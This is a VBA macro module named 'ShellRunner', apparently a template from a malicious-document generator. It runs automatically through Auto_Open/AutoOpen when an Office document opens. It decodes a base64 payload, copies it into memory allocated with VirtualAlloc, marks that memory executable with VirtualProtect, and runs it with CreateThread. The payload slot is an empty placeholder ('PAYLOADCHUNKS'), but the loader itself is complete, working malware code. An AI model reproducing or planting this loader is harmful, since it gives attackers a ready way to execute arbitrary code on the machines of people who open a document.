Attribute VB_Name = "ShellRunner"
#If VBA7 Then
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
    Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, ByRef src As Any, ByVal length As LongPtr)
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
    Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long
#Else
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function VirtualProtect Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
    Private Declare Sub RtlMoveMemory Lib "kernel32" (ByVal dest As Long, ByRef src As Any, ByVal length As Long)
    Private Declare Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long
    Private Declare Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
#End If

Sub Auto_Open()
    Run
End Sub

Sub AutoOpen()
    Run
End Sub

Private Sub Run()
    On Error GoTo ErrHandler

    Dim xml As Object
    Set xml = CreateObject("MSXML2.DOMDocument.3.0")
    Dim elem As Object
    Set elem = xml.createElement("b")
    elem.dataType = "bin.base64"
    elem.Text = GetPayload()
    Dim scBytes() As Byte
    scBytes = elem.nodeTypedValue
    Set elem = Nothing
    Set xml = Nothing

    Dim scLen As Long
    scLen = UBound(scBytes) + 1

    ' ALLOC_START
    Dim addr As LongPtr
    addr = VirtualAlloc(0, scLen, &H3000, &H4)
    If addr = 0 Then Exit Sub
    RtlMoveMemory addr, scBytes(0), scLen
    Dim oldProtect As Long
    VirtualProtect addr, scLen, &H20, oldProtect
    Dim hThread As LongPtr
    Dim threadId As Long
    hThread = CreateThread(0, 0, addr, 0, 0, threadId)
    ' WAIT_START
    If hThread <> 0 Then
        WaitForSingleObject hThread, &HFFFFFFFF
    End If
    ' WAIT_END
    ' ALLOC_END

    Exit Sub
ErrHandler:
    MsgBox "Error " & Err.Number & ": " & Err.Description
End Sub

Private Function GetPayload() As String
    Dim s As String
    s = ""
    ' PAYLOADCHUNKS
    GetPayload = s
End Function
